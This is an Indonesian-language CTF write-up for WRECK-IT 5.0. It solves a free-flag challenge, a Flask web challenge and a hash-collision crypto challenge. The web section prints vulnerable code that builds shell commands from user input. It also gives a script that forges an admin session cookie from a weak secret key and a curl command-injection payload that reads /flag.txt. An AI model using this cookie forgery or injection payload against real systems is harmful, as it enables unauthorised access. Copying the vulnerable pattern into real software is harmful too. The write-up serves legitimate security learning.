---
title: WRECK-IT 5.0 CTF WRITEUP
author: ywdh
tags: ["ctf"]
date: 2024-08-22
---

# WRECK-IT 5.0 CTF WRITEUP

[TOC]

# Misc

## Free Flag

### Deskripsi

<details>
WRECKIT50{just_ch3cking_f0r_y0ur_sani7y}
</details>

### Langkah Penyelesaian

- Flag gratis untuk permulaan dan sudah tertera di challenge description. Jadi, tinggal masukan saja flagnya.

### Flag

==WRECKIT50{just_ch3cking_f0r_y0ur_sani7y}==

# Web

## Oshiku

### Deskripsi

<details>
Challenge Sederhana. iya kan?
<br>
137.184.250.54:7012
<br>
mirror : 146.190.104.208:7012
<br><br>
Author: ZeroEXP
</details>

### Langkah Penyelesaian

- Diberikan sebuah file `dist.rar`, yang setelah diekstrak muncul 2 file berupa aplikasi Flask: `app.py` & `database.db` . Berikut adalah source code ke-2 file tersebut.

<kbd>app.py</kbd>
```python=
from flask import *
import sqlite3
import os
import subprocess

app = Flask(__name__)
app.secret_key = 'os.urandom(8)'

# Database connection
DATABASE = "database.db"
def query_database(name):
    query = 'sqlite3 database.db "SELECT biography FROM oshi WHERE name=\'' + str(name) +'\'\"'
    result = subprocess.check_output(query, shell=True, text=True)
    return result

@app.route("/")
def index():
    role = session.get('role')
    if role == "admin":
        return redirect(url_for('admin'))
    elif role == "guest":
        return redirect(url_for('guest'))
    else:
        return redirect(url_for('login'))

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if username == "guest" and password == "guest":
            session['username'] = username
            session['role'] = "guest"
            return redirect(url_for('guest'))
        else:
            return jsonify({"msg": "Bad username or password"}), 401
    return render_template("login.html")

@app.route("/admin", methods=["GET", "POST"])
def admin():
    if 'role' not in session or session['role'] != "admin":
        return jsonify({"msg": "Access forbidden: Admins only"}), 403

    if request.method == "POST":
        selected_name = request.form.get("oshi_name")
        biography = query_database(selected_name)
        return render_template("admin.html", biography=biography)
    return render_template("admin.html", biography="")

@app.route("/guest", methods=["GET", "POST"])
def guest():
    if 'role' not in session or session['role'] != "guest":
        return jsonify({"msg": "Access forbidden: Guests only"}), 403
    return render_template("guest.html")

@app.route("/logout")
def logout():
    session.pop('username', None)
    session.pop('role', None)
    return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(debug=False,host='0.0.0.0')
```

<kbd>database.py</kbd>
```python=
��g''�ormat 3t]''wtablecyberIwtableoshioshiCREATE TABLE "oshi" (
"name" TEXT,
"biography" TEXT
) # ...omitted...
```
 
- Awal saya analisis file app.py, saya menyadari bahwa secret_key yang digunakan adalah berupa string biasa / tidak random (_weak secret key_). Dari situ, saya langsung craft python script untuk men-generate sebuah JWT token agar bisa login sebagai admin dengan memanfaatkan **role=”admin”**. Berikut adalah kodenya.

<kbd>gen_session_cookie.py</kbd>
```python=
# GENERATE ADMIN SESSION COOKIE USING WEAK SECRET KEY!
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer
import requests

# Fungsi untuk membuat sesi palsu
def create_session(secret_key, data):
    session_interface = SecureCookieSessionInterface()
    serializer = URLSafeTimedSerializer(
        secret_key,
        salt='cookie-session',
        signer_kwargs={'key_derivation': 'hmac', 'digest_method': 'sha1'}
    )
    return serializer.dumps(data)

# URL target
url = "http://146.190.104.208:7012"

# Buat sesi palsu
secret_key = 'os.urandom(8)'
session_data = {'role': 'admin'}
fake_session = create_session(secret_key, session_data)
print(fake_session)
```

![Oshiku-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/wreckit5.0_web1-01.png)

- Setelah berhasil login sebagai admin, saya coba baca lagi source code flask-nya. Awalnya, saya berpikir jika di fungsi `query_database` adalah kerentanan _SQL Injection_, tapi ternyata saya salah. Itu merupakan kerentanan _**Command Injection**_. Langsung saja saya craft payloadnya dan coba kirim request tersebut via cURL menggunakan cookie admin yang sudah di-generate sebelumnya.
- Berikut adalah POC untuk get flag-nya:

<kbd>solver.sh</kbd>
```bash
curl -X POST -d "oshi_name=freya\"; cat /flag.txt; echo #" --cookie "session=eyJyb2xlIjoiYWRtaW4ifQ.ZrbXaQ.9CjlFr995lsT5RjKbe9D_6t4kMg" http://146.190.104.208:7012/admin
```

![Oshiku-02](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/wreckit5.0_web1-02.png)

### Flag

==WRECKIT50{oshikucumansatukok_satujkt}==

# Crypto

## m4k c0MbL4n6

### Deskripsi

<details>
aku lagi jomblo. tolong carikan aku jodoh
<br>
Thanks to hash designer & attacker: @hakim01a (IG) & @yudik_suta (IG)
<br>
Connected to : nc 188.166.247.108 6969
<br>
alt: nc 13.212.238.29 6969
<br><br>
Author : ac3
</details>

### Langkah Penyelesaian

- Diberikan 2 file, yaitu `propietary.py` dan `chall.py` .

<kbd>propietary.py</kbd>
```python=
import math

def biner_ke_hex(biner):
    desimal = int(biner, 2)
    heksadesimal = hex(desimal)
    return heksadesimal[2:]

def float_bin(my_number, places=3):
    my_whole, my_dec = str(my_number).split(".")
    my_whole = int(my_whole)
    res = (str(bin(my_whole))+".").replace('0b','')

    for x in range(places):
        my_dec = str('0.')+str(my_dec)
        temp = '%1.20f' %(float(my_dec)*2)
        my_whole, my_dec = temp.split(".")
        res += my_whole
    return res

def cyclic_left_shift(value, shift):
    return ((value << shift) & 0xFFFFFFFF) | (value >> (32 - shift))

def binary32(n):
    sign = 0
    if n < 0:
        sign = 1
        n = n * (-1)
    p = 30
    dec = float_bin(n, places=p)

    dotPlace = dec.find('.')
    onePlace = dec.find('1')
    if onePlace > dotPlace:
        dec = dec.replace(".","")
        onePlace -= 1
        dotPlace -= 1
    elif onePlace < dotPlace:
        dec = dec.replace(".","")
        dotPlace -= 1
    mantissa = dec[onePlace+1:]

    exponent = dotPlace - onePlace
    exponent_bits = exponent + 127
    exponent_bits = bin(exponent_bits).replace("0b",'')
    mantissa = mantissa[0:23]

    final = str(sign) + exponent_bits.zfill(8) + mantissa
    return final

def parse_input(x):
    if len(x) != 32:
        raise ValueError("Input harus 32-bit string")

    xl = x[:12]
    xm = x[12:28]
    xr = x[28:]

    return xl, xm, xr

def calculate_parameters(xl, xm, xr):
    gama_awal = int(xl, 2) * (1 / 2**12)
    eta = (int(xm, 2) * (2 / 2**16)) + 2
    k = (int(xr, 2) * (1 / 2**4)) + 10.01
    n = math.floor(6 * gama_awal)

    return gama_awal, eta, k, n

def fL(eta, gama_n):
    return eta * gama_n * (1 - gama_n)

def gamma_function(gama_awal, eta, k, n, i):
    gama = gama_awal
    for i in range(n + i):
        gama = (2**k / 2**fL(eta, gama)) % 1
    return gama

def ELM(x):
    xl, xm, xr = parse_input(x)
    gama_awal, eta, k, n = calculate_parameters(xl, xm, xr)
    gama_n1 = gamma_function(gama_awal, eta, k, n, 1)
    gama_n2 = gamma_function(gama_awal, eta, k, n, 2)

    w1 = binary32(gama_n1 * (10**(10)))
    w2 = binary32(gama_n2)
    y = (cyclic_left_shift(int(w1,2), 17)) ^ (int(w2,2))
    return format(y, '032b')

def transform_f(x):
    blocks = [x[i:i+32] for i in range(0, 256, 32)]

    x_prev = '0' * 32
    for i in range(8):
        x_curr = blocks[i]
        blocks[i] = ELM(format(int(x_curr, 2) ^ int(x_prev, 2),'032b'))
        x_prev = blocks[i]

    blocks[0] = format((cyclic_left_shift(int(blocks[0], 2), 19) + (cyclic_left_shift(int(blocks[2], 2), 9) % (2**32))), '032b')
    blocks[4] = format(cyclic_left_shift(int(blocks[4], 2) ^ cyclic_left_shift(int(blocks[2], 2), 9), 7), '032b')
    blocks[5] = format(cyclic_left_shift(int(blocks[5], 2) ^ cyclic_left_shift(int(blocks[3], 2), 17), 13), '032b')
    blocks[6] = format((int(blocks[6], 2) + int(blocks[4], 2)) % (2**32), '032b')
    blocks[7] = format(cyclic_left_shift(int(blocks[7], 2), 11) ^ int(blocks[5], 2), '032b')
    blocks[1] = format(int(blocks[1], 2) + int(blocks[5], 2), '032b')
    blocks[2] = format(cyclic_left_shift(int(blocks[2], 2), 9) ^ int(blocks[6], 2), '032b')
    blocks[3] = format((cyclic_left_shift(int(blocks[3], 2), 17) + int(blocks[1], 2)) % (2**32), '032b')

    return ''.join(blocks)

def convert_to_32bit_hex(input_hex):
    input_int = int(input_hex[:8], 16)  # Ambil 8 digit pertama jika lebih panjang dari 8 digit
    bit_string = format(input_int, '032b')  # Konversi integer ke 32 bit biner dengan leading zeros

    return bit_string

# Fungsi hash HORTEX
def HORTEX(input_hex):
    X_bin = convert_to_32bit_hex(input_hex)
    pad_len = (64 - (len(X_bin) % 64)) % 64
    X_padded = X_bin + '1' + '0' * (pad_len - 1)

    r, c = 64, 192
    state = '0' * (r + c)

    state_int = int(state[:r], 2)
    block_int = int(X_padded, 2)
    updated_state = format(state_int ^ block_int, '064b') + '0'*c
    after_abs = transform_f(updated_state)

    s0 = transform_f(after_abs)
    h1 = s0[:r]
    state = transform_f(s0)
    h2 = state[:r]

    h1_hex = format(int(h1, 2), '016x')
    h2_hex = format(int(h2, 2), '016x')
    return h1_hex + h2_hex
```

<kbd>chall.py</kbd>
```python=
from propietary import *
def print_diagram():
    diagram = """
    Sistem Penjodohan oleh Mak Comblang. Semoga cocok :)
    """

    print(diagram)

if __name__ == "__main__":
    print_diagram()

while True:
        X_hex = input('choose your man (hex): ')
        Y_hex = input('choose your woman (hex): ')

        hash_value1 = HORTEX(X_hex)
        hash_value2 = HORTEX(Y_hex)

        if hash_value1 == hash_value2 and X_hex != Y_hex:
                print("New couple is matched :). Here your flag WRECKIT50{REDACTED}")
                break
        else:
                print("Try again")
                break
```

- Setelah menganalisis kedua file tersebut, saya menemukan kerentanan potensial dalam implementasi fungsi hash `HORTEX` .
- Fungsi HORTEX hanya mengambil **8 digit pertama** dari input hex (32 bit).
- Padding dilakukan setelah konversi ke biner, yang berarti input yang berbeda bisa menghasilkan hash yang sama jika 8 digit pertamanya sama.
- Kemudian, saya membuat dua inputan (X dan Y) yang berbeda tapi dengan 8 digit awalnya sama, sisanya tinggal dibedakan. Tanpa ambil pusing, saya langsung membuatnya seperti ini.
    - X_hex = "**12345678aaaaaaaa**"
    - Y_hex = "**12345678bbbbbbbb**"
- Karena X_hex dan Y_hex berbeda (**syarat X_hex != Y_hex terpenuhi**), maka program akan menampilkan flag.

![m4k c0MbL4n6-01](https://raw.githubusercontent.com/whyuhurtz/hackmd-blog/main/2024/_assets/wreckit5.0_crypto1-01.png)

### Flag

==WRECKIT50{fUnCt10n_Sh0uLd_nOt_13Ij3cT1On}==
